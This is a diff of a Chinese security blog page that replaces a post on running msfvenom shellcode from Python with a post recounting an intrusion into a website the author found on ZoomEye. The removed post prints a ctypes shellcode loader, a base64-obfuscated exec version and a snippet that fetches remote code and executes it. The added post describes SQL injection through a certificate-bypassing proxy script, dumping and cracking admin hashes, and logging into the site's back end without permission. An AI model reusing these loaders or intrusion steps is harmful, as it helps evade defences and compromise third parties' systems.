@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>python exec shellcode | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="python exec shellcode | 九世的博客">
+  <title>一次浪荡的渗透 | 九世的博客</title>
+  <meta name="keywords" content=" 渗透 ">
+  <meta name="description" content="一次浪荡的渗透 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -898,9 +898,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-python-exec-shellcode" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-一次浪荡的渗透" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">python exec shellcode</h1>
+        <h1 class="article-title">一次浪荡的渗透</h1>
     
     <div class="article-meta">
         
@@ -909,14 +909,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-03 13:12</time>
+        创建时间:<time class="date" title="更新时间: 2019-07-26 20:06:45">2019-07-26 18:15</time>
         
     </div>
     <div class="article-meta">
@@ -938,7 +938,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -953,17 +953,37 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里我先吐槽一下，网上用中文搜的python执行shellcode。全部是复制粘贴，棒的我不知道如何下手<br>然后今天早上@即刻安全-Yansu老哥帮我整出来了。老板喝茶<br><img src="http://tama-yura.jp/animetory/img/entries/52846dbee7b659d2ab96736ffaa6ab8d4d8e24d0/53ad87b62d957/pc/15.jpg" alt="15.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>代码我理解不了多少，可能还有错的<br>获取shellcode<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=calc.exe -f py -o /root/demo.py</span><br></pre></td></tr></table></figure></p>
-<p>执行shellcode代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"</span></span><br><span class="line">buf += <span class="string">b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"</span></span><br><span class="line">buf += <span class="string">b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"</span></span><br><span class="line">buf += <span class="string">b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"</span></span><br><span class="line">buf += <span class="string">b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"</span></span><br><span class="line">buf += <span class="string">b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"</span></span><br><span class="line">buf += <span class="string">b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"</span></span><br><span class="line">buf += <span class="string">b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"</span></span><br><span class="line">buf += <span class="string">b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"</span></span><br><span class="line">buf += <span class="string">b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"</span></span><br><span class="line">buf += <span class="string">b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"</span></span><br><span class="line">buf += <span class="string">b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"</span></span><br><span class="line">buf += <span class="string">b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"</span></span><br><span class="line">buf += <span class="string">b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"</span></span><br><span class="line">buf += <span class="string">b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"</span></span><br><span class="line">buf += <span class="string">b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"</span></span><br><span class="line">buf += <span class="string">b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line">buf += <span class="string">b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"</span></span><br><span class="line">buf += <span class="string">b"\x78\x65\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEM</span></span><br><span class="line">PAGE_EXECUTE_READWRITE  =  <span class="number">0x00000040</span> <span class="comment">#参数设定</span></span><br><span class="line">VIRTUAL_MEM  =  ( <span class="number">0x1000</span> | <span class="number">0x2000</span> ) <span class="comment">#参数设定</span></span><br><span class="line">buf_arr = bytearray (buf) <span class="comment">#shellcode变为一个新的字节数组</span></span><br><span class="line">buf_size = len(buf_arr) <span class="comment">#计算shellcode的大小</span></span><br><span class="line">kernel32 = ctypes.cdll.LoadLibrary(<span class="string">"kernel32.dll"</span>) <span class="comment">#调用kernel32.dll</span></span><br><span class="line">kernel32.VirtualAlloc.restype = ctypes.c_uint64 <span class="comment">#返回类型为c_uint64</span></span><br><span class="line">sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) <span class="comment">#设置</span></span><br><span class="line">buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) <span class="comment">#将shellcode指向指针</span></span><br><span class="line">print(sc_ptr)</span><br><span class="line">print(buf_ptr)</span><br><span class="line">kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) <span class="comment">#调用dll，指向shellcode</span></span><br><span class="line"></span><br><span class="line">handle = kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_uint64(sc_ptr),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure></p>
-<p>注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的shellcode是弹计算器的</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/02/03/kGMR8x.md.png" alt="kGMR8x.md.png"></p>
-<p>如果你觉得长的离谱那么，你可以这样执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload=B<span class="string">"aW1wb3J0IGN0eXBlcw0KaW1wb3J0IHN5cw0KZnJvbSBjdHlwZXMgaW1wb3J0ICoNCmJ1ZiA9ICBiIiINCmJ1ZiArPSBiIlx4ZmNceDQ4XHg4M1x4ZTRceGYwXHhlOFx4YzBceDAwXHgwMFx4MDBceDQxXHg1MVx4NDEiDQpidWYgKz0gYiJceDUwXHg1Mlx4NTFceDU2XHg0OFx4MzFceGQyXHg2NVx4NDhceDhiXHg1Mlx4NjBceDQ4Ig0KYnVmICs9IGIiXHg4Ylx4NTJceDE4XHg0OFx4OGJceDUyXHgyMFx4NDhceDhiXHg3Mlx4NTBceDQ4XHgwZiINCmJ1ZiArPSBiIlx4YjdceDRhXHg0YVx4NGRceDMxXHhjOVx4NDhceDMxXHhjMFx4YWNceDNjXHg2MVx4N2MiDQpidWYgKz0gYiJceDAyXHgyY1x4MjBceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHhlMlx4ZWRceDUyIg0KYnVmICs9IGIiXHg0MVx4NTFceDQ4XHg4Ylx4NTJceDIwXHg4Ylx4NDJceDNjXHg0OFx4MDFceGQwXHg4YiINCmJ1ZiArPSBiIlx4ODBceDg4XHgwMFx4MDBceDAwXHg0OFx4ODVceGMwXHg3NFx4NjdceDQ4XHgwMVx4ZDAiDQpidWYgKz0gYiJceDUwXHg4Ylx4NDhceDE4XHg0NFx4OGJceDQwXHgyMFx4NDlceDAxXHhkMFx4ZTNceDU2Ig0KYnVmICs9IGIiXHg0OFx4ZmZceGM5XHg0MVx4OGJceDM0XHg4OFx4NDhceDAxXHhkNlx4NGRceDMxXHhjOSINCmJ1ZiArPSBiIlx4NDhceDMxXHhjMFx4YWNceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHgzOFx4ZTAiDQpidWYgKz0gYiJceDc1XHhmMVx4NGNceDAzXHg0Y1x4MjRceDA4XHg0NVx4MzlceGQxXHg3NVx4ZDhceDU4Ig0KYnVmICs9IGIiXHg0NFx4OGJceDQwXHgyNFx4NDlceDAxXHhkMFx4NjZceDQxXHg4Ylx4MGNceDQ4XHg0NCINCmJ1ZiArPSBiIlx4OGJceDQwXHgxY1x4NDlceDAxXHhkMFx4NDFceDhiXHgwNFx4ODhceDQ4XHgwMVx4ZDAiDQpidWYgKz0gYiJceDQxXHg1OFx4NDFceDU4XHg1ZVx4NTlceDVhXHg0MVx4NThceDQxXHg1OVx4NDFceDVhIg0KYnVmICs9IGIiXHg0OFx4ODNceGVjXHgyMFx4NDFceDUyXHhmZlx4ZTBceDU4XHg0MVx4NTlceDVhXHg0OCINCmJ1ZiArPSBiIlx4OGJceDEyXHhlOVx4NTdceGZmXHhmZlx4ZmZceDVkXHg0OFx4YmFceDAxXHgwMFx4MDAiDQpidWYgKz0gYiJceDAwXHgwMFx4MDBceDAwXHgwMFx4NDhceDhkXHg4ZFx4MDFceDAxXHgwMFx4MDBceDQxIg0KYnVmICs9IGIiXHhiYVx4MzFceDhiXHg2Zlx4ODdceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XHg0MSINCmJ1ZiArPSBiIlx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDYiDQpidWYgKz0gYiJceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhIg0KYnVmICs9IGIiXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNVx4NjNceDYxXHg2Y1x4NjNceDJlXHg2NSINCmJ1ZiArPSBiIlx4NzhceDY1XHgwMCINCg0KI+i/meS4pOS4quW+rui9r+WumOaWueivtOaYjuaYr+WPr+ivu+WPr+WGmeWPr+aJp+ihjO+8jFBBR0VfRVhFQ1VURV9SRUFEV1JJVEXlkoxWSVJUVUFMX01FTQ0KUEFHRV9FWEVDVVRFX1JFQURXUklURSAgPSAgMHgwMDAwMDA0MCAj5Y+C5pWw6K6+5a6aDQpWSVJUVUFMX01FTSAgPSAgKCAweDEwMDAgfCAweDIwMDAgKSAj5Y+C5pWw6K6+5a6aDQpidWZfYXJyID0gYnl0ZWFycmF5IChidWYpICNzaGVsbGNvZGXlj5jkuLrkuIDkuKrmlrDnmoTlrZfoioLmlbDnu4QNCmJ1Zl9zaXplID0gbGVuKGJ1Zl9hcnIpICPorqHnrpdzaGVsbGNvZGXnmoTlpKflsI8NCmtlcm5lbDMyID0gY3R5cGVzLmNkbGwuTG9hZExpYnJhcnkoImtlcm5lbDMyLmRsbCIpICPosIPnlKhrZXJuZWwzMi5kbGwNCmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0ICPov5Tlm57nsbvlnovkuLpjX3VpbnQ2NA0Kc2NfcHRyID0ga2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGJ1Zl9zaXplKSwgVklSVFVBTF9NRU0sIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpICPorr7nva4NCmJ1Zl9wdHIgPSAoY3R5cGVzLmNfY2hhciAqIGJ1Zl9zaXplKS5mcm9tX2J1ZmZlcihidWZfYXJyKSAj5bCGc2hlbGxjb2Rl5oyH5ZCR5oyH6ZKIDQpwcmludChzY19wdHIpDQpwcmludChidWZfcHRyKQ0Ka2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQoc2NfcHRyKSxidWZfcHRyLGN0eXBlcy5jX2ludChidWZfc2l6ZSkpICPosIPnlKhkbGzvvIzmjIflkJFzaGVsbGNvZGUNCg0KaGFuZGxlID0ga2VybmVsMzIuQ3JlYXRlVGhyZWFkKGN0eXBlcy5jX2ludCgwKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuY19pbnQoMCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfdWludDY0KHNjX3B0ciksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfaW50KDApLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN0eXBlcy5jX2ludCgwKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpKQ0Ka2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoaGFuZGxlKSxjdHlwZXMuY19pbnQoLTEpKQ=="</span></span><br><span class="line">exec(base64.b64decode(payload))</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/02/03/kGMfxK.md.png" alt=""></p>
-<p>在或者说，你可以选择远程读取并执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://127.0.0.1/wc.txt'</span></span><br><span class="line">rqt=requests.get(url=url)</span><br><span class="line">exec(base64.b64decode(rqt.text))</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/02/03/kGMHIA.md.png" alt=""></p>
-<p>如果想获取到meterpreter的话相信诸位都懂的，手动滑稽</p>
-<p>最后还是谢谢Yansu老哥<br>转载请声明：转自422926799.github.io</p>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=451171191&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在zoomeye瞎逛，找到个站，顺手搞搞，到后面还是没能拿下shell，kindeditor编辑器真草….</p>
+<p><img src="https://s2.ax1x.com/2019/07/26/eu99t1.png" alt="eu99t1.png"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>zoomeye搜到的就是一个IP<br><img src="https://s2.ax1x.com/2019/07/26/eu9R41.png" alt="eu9R41.png"></p>
+<p>whois就不查了，毛用没有又不是搞服务商…..除了自我安慰，哎<br>旁站查询走一波：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具</a><br><img src="https://s2.ax1x.com/2019/07/26/eu9f9x.png" alt="eu9f9x.png"></p>
+<p>我他妈….<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>
+<p>用ip138查查同IP<br><a href="http://site.ip138.com" target="_blank" rel="noopener">域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询</a><br><img src="https://s2.ax1x.com/2019/07/26/euCV2V.png" alt="euCV2V.png"></p>
+<p>域名全部ping了一遍…发现一个域名不是同一个IP，超级ping了一下，发现在山西有个节点<br><img src="https://s2.ax1x.com/2019/07/26/euC5in.png" alt="euC5in.png"></p>
+<p>端口扫描了一波，发现有节点的那个域名出现在443端口，估计是多个域名解析到同一个DNS<br><img src="https://s2.ax1x.com/2019/07/26/euCzJ1.png" alt="euCzJ1.png"></p>
+<p>7kb扫描工具一顿扫，没扫出来<br><img src="https://s2.ax1x.com/2019/07/26/euATDf.png" alt="euATDf.png"></p>
+<p>。。。<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>
+<p>打开这个站一看，后台光明正大的写在主页<br><img src="https://s2.ax1x.com/2019/07/26/euEV2R.md.png" alt="euEV2R.md.png"></p>
+<p>。。。<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>
+<p>整理了一下收集到的信息<br><img src="https://s2.ax1x.com/2019/07/26/euZkcR.png" alt="euZkcR.png"></p>
+<p>随便点了一下链接发现有类似&amp;id=的url，测试了一下注入，发现SQL注入<br><img src="https://s2.ax1x.com/2019/07/26/euEgs0.png" alt="euEgs0.png"></p>
+<p>当时就想着扔sqlmap里面跑，然后sqlmap报错。。后面想了一下这个的https证书是有问题的，还有就是sqlmap跑类似于以下的url会发神经<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/test.php?user=demo&amp;id=1</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/07/26/euEzJH.png" alt="euEzJH.png"></p>
+<p>https证书有问题<br><img src="https://s2.ax1x.com/2019/07/26/euViOP.png" alt="euViOP.png"></p>
+<p>百思不得其解的时候，搜到了篇文章<br><a href="https://michaelwayneliu.github.io/2018/08/28/sqlmap%E5%9C%A8https%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF/" target="_blank" rel="noopener">sqlmap在https情况下的一个错误 | MSAREHERE</a><br>文章的作者使用在本地写了个php，然后使用curl配置屏蔽掉https错误，然后在通过curl发送数据给目标站点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">$url = <span class="string">"http://xxx.com"</span>;</span><br><span class="line">$sql = $_GET[s];</span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$url = $url.$sql;</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="comment">// $params = "email=$s&amp;password=aa";</span></span><br><span class="line"><span class="comment">//echo $params;</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); <span class="comment">// https请求 不验证证书和hosts</span></span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, <span class="string">'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)'</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">15</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式</span></span><br><span class="line"><span class="comment">// curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span></span><br><span class="line">  </span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br><span class="line">$a = strlen($output);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>本地访问了一下还真的ok<br><img src="https://s2.ax1x.com/2019/07/26/euVJkF.png" alt="euVJkF.png"></p>
+<p>然后直接扔sqlmap跑就ok<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1/demos.php?s=%20*</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/07/26/euValR.png" alt="euValR.png"></p>
+<p>然后发现不是dba权限<br><img src="https://s2.ax1x.com/2019/07/26/euVfXt.png" alt="euVfXt.png"></p>
+<p>dump出后台的hash发现还有两个跑不出<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>
+<p>还好最后一个hash跑出来了<br><img src="https://s2.ax1x.com/2019/07/26/euVI78.png" alt="euVI78.png"></p>
+<p>得到用户名密码<br><img src="https://s2.ax1x.com/2019/07/26/euZVnx.png" alt="euZVnx.png"></p>
+<p>后台一登陆，看见编辑器kindeditor<br><img src="https://s2.ax1x.com/2019/07/26/euZsuq.png" alt="euZsuq.png"></p>
+<p>google搜了一遍，发现只能重命名或者备份getshell<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>
+<p><a href="https://blog.dyboy.cn/websecurity/52.html" target="_blank" rel="noopener">[渗透实战]某铸造设备公司官网经典思路 - DYBOY - 专注程序开发与信息安全</a></p>
+<p>原本打算子域名看看能不能搞的，查出来的都是什么<br><img src="https://s2.ax1x.com/2019/07/26/eueV2j.png" alt="eueV2j.png"><br>本文到此结束，真是玩毛….<br><img src="https://s2.ax1x.com/2019/07/26/eu9h36.jpg" alt="eu9h36.jpg"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -973,12 +993,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>python exec shellcode</p>
+    <p><span class="copy-title">文章标题:</span>一次浪荡的渗透</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-03, 13:12:57</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/a3f2d98a.html" title="python exec shellcode">http://422926799.github.io/posts/a3f2d98a.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-07-26, 18:15:25</p>
+    <p><span class="copy-title">最后更新:</span>2019-07-26, 20:06:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/949b4019.html" title="一次浪荡的渗透">http://422926799.github.io/posts/949b4019.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
